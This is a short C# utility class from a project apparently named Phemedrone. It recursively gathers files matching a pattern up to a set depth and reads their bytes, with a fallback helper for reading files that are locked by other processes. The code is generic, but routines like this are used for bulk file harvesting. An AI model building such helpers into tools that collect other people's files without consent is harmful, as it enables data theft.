using System;
using System.Collections.Generic;
using System.IO;

namespace Phemedrone.Extensions
{
    public static class FileManager
    {
        public static List<string> EnumerateFiles(string currentDirectory, string searchPattern, int maxDepth, int currentDepth = 0)
        {
            var result = new List<string>();
            if (currentDepth >= maxDepth)
                return result;

            try
            {
                var files = Directory.GetFiles(currentDirectory, searchPattern);
                result.AddRange(files);

                var directories = Directory.GetDirectories(currentDirectory);
                foreach (var directory in directories)
                {
                    result.AddRange(EnumerateFiles(directory, searchPattern, maxDepth, currentDepth + 1));
                }
            }
            catch (UnauthorizedAccessException)
            {
                // Handle unauthorized access exception if necessary
            }
            catch (PathTooLongException)
            {
                // Handle path too long exception if necessary
            }
            catch (DirectoryNotFoundException)
            {
                // Handle directory not found exception if necessary
            }

            return result;
        }
        
        public static byte[] ReadFile(string filePath)
        {
            var content = NullableValue.Call(() => File.ReadAllBytes(filePath)) ?? LockHelper.ReadFile(filePath);
            return content;
        }
    }
}